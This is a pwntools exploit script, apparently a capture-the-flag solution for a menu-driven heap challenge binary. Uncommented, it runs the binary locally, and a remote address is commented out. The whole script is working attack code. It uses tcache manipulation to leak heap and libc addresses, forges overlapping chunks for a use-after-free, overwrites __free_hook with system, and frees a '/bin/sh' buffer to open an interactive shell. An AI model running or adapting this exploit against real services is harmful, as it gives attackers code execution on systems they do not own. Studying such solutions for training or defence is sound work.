from pwn import *
# io=remote("10.75.1.25",58011)
#io= process("./pwn",env={"LD_PRELOAD":"./libc.so.6"})
p= process("./pwn")
context.log_level='debug'
# libc = ELF("./libc.so.6")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add():
    p.sendlineafter("Choice: ",str(1))

def free(index):
    p.sendlineafter("Choice: ",str(2))
    p.sendlineafter("Idx: ",str(index))

def show(index):
    p.sendlineafter("Choice: ",str(3))
    p.sendlineafter("Idx: ",str(index))

def edit(index,size,content):
    p.sendlineafter("Choice: ",str(4))
    p.sendlineafter("Idx: ",str(index))
    p.sendlineafter("Size: ",str(size))
    p.sendafter("Content: ",content)

attach(p)
for i in range(7):
    add()
for i in range(7): #put into tcache
    free(i)

add()
show(0)
p.recvline()
heap_base = u64((p.recv(6)).ljust(8,b"\x00"))-0x7a0
print "heap_addr:"+hex(heap_base)

free(0)

for i in range(12):
	add()

for j in range(7):
	free(j)
free(9)
free(10)

for i in range(7):
	add()

add()
show(9)
libc_base = u64((p.recvuntil('\x7f')).ljust(8,"\x00"))/0x100 - 592 - 0x1ecb80
print "libc_base=>"+hex(libc_base)

add()

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base+libc.sym['system']

for i in range(7):
	free(6-i)

payload = p64(0)+p64(0x1f1)+p64(heap_base+0x9a0)+p64(heap_base+0x9a0)
payload1 = 'a'*0xf0 + p64(0x1f0)
edit(7,len(payload),payload)
edit(8,len(payload1),payload1)
free(9)
# pause()

for i in range(7):
	add()

add()#9 uaf
free(0)
pause()
free(9)
payload = p64(0)+p64(0x100) + p64(free_hook) + p64(heap_base+0x10)#key
edit(7,len(payload),payload)
add()#0
add()#9 freehook
edit(9,0x8,p64(system))
edit(1,8,'/bin/sh\x00')
free(1)


p.interactive()